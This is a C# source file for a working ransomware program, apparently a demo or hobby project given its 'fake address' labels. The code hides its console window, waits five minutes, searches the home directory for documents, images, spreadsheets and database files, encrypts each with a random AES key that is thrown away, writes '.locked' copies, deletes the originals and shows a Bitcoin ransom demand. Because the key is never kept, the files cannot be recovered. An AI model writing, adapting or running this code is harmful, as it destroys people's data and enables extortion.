using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace ConsoleApp3
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        //private const string KEY = "kqufuwAvmcTZxQTj8x6OFNmDgisUjoi1";
        private const string IV = "PzPKZ0fuM4LIuaVa";

        public static string createkey(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        public static byte[] encrypt(string message)
        {
            AesCryptoServiceProvider _aes = new AesCryptoServiceProvider();
            _aes.BlockSize = 128;
            _aes.KeySize = 256;
            // To make it just a little bit harder.
            string KEY = createkey(32);
            _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
            _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
            _aes.Padding = PaddingMode.PKCS7;
            _aes.Mode = CipherMode.CBC;
            ICryptoTransform _crypto = _aes.CreateEncryptor(_aes.Key, _aes.IV);
            byte[] encrypted = _crypto.TransformFinalBlock(
                ASCIIEncoding.ASCII.GetBytes(message), 0, ASCIIEncoding.ASCII.GetBytes(message).Length);
            _crypto.Dispose();
            return encrypted;
        }

        public static byte[] decrypt(byte[] message)
        {
            AesCryptoServiceProvider _aes = new AesCryptoServiceProvider();
            _aes.BlockSize = 128;
            _aes.KeySize = 256;
            string KEY = "";
            _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
            _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
            _aes.Padding = PaddingMode.PKCS7;
            _aes.Mode = CipherMode.CBC;
            ICryptoTransform _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
            byte[] decrypted = _crypto.TransformFinalBlock(
                 message, 0, message.Length);
            _crypto.Dispose();
            return decrypted;
        }
    

    public static bool ByteArrayToFile(string fileName, byte[] byteArray)
        {
            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    fs.Write(byteArray, 0, byteArray.Length);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in process: {0}", ex);
                return false;
            }
        }

        public static List<String> DirSearchhelper(string sDir)
        {
            Regex reeeeeeeeeee = new Regex(@"(^.*\.txt$|^.*\.doc$|^.*\.docx$|^.*\.xls$|^.*\.xlsx$|^.*\.ppt$|^.*\.pptx$|^.*\.txt$|^.*\.sql$|^.*\.jpg$|^.*\.png$|^.*\.csv$)", RegexOptions.IgnoreCase);
            List<String> files = new List<String>();
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (reeeeeeeeeee.Match(f).Success)
                    {
                        files.Add(f);
                    }
                }
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    files.AddRange(DirSearchhelper(d));
                }
            }
            catch (System.Exception excpt)
            {
                //Console.WriteLine(excpt.Message);
            }
            return files;
        }

        static void DirSearch(List<string> filesPaths)
        {
            try
            {
                byte[] bytes_result;
                byte[] readText_bytes;
                string readText;
                string readText_string;
                

                foreach (string f in filesPaths)
                    {
                    readText = File.ReadAllText(f);
                    bytes_result = encrypt(readText);
                    ByteArrayToFile(f+ ".locked", bytes_result);
                    File.Delete(f);
                }


            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }


        static void Main(string[] args)
        {
            var handle = System.Diagnostics.Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(handle, 0);
            System.Threading.Thread.Sleep(5 * 60 *  1000);
            string idFile = @"killswitch.txt";
            string homePath = (Environment.OSVersion.Platform == PlatformID.Unix ||
                        Environment.OSVersion.Platform == PlatformID.MacOSX)
                        ? Environment.GetEnvironmentVariable("HOME")
                        : Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");
            Console.WriteLine(homePath);
            Program p = new Program();
            List<string>  files = DirSearchhelper(homePath);

            if (File.Exists(idFile)){
                System.Environment.Exit(0);
            }
            else {
                DirSearch(files);
                File.WriteAllText("killswitch.txt", "Send 0.001 BTC to this address: Wav2Uec3HB2Z9zeF1k9zejGykSmqLARe9 (fake address).");
            }

            string message = "Send 0.001 BTC to this address: Wav2Uec3HB2Z9zeF1k9zejGykSmqLARe9 to get your files back : )";
            string caption = "(Fake address)";
            MessageBox.Show(message, caption);
        }
    }
}
